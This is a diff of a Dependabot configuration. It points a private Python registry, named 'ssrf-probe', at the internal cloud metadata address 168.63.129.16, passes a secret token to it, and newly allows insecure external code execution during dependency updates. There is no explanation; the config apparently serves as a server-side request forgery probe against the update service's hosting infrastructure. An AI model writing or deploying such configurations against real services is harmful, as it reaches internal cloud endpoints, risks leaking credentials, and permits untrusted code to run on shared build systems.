@@ -1,14 +1,14 @@
 version: 2
 registries:
   ssrf-probe:
-    type: npm-registry
+    type: python-index
     url: http://168.63.129.16:80
     token: ${{ secrets.SSRF_TOKEN }}
-    replaces-base: true
 updates:
-  - package-ecosystem: "npm"
+  - package-ecosystem: "pip"
     directory: "/"
     schedule:
       interval: "daily"
+    insecure-external-code-execution: allow
     registries:
       - ssrf-probe
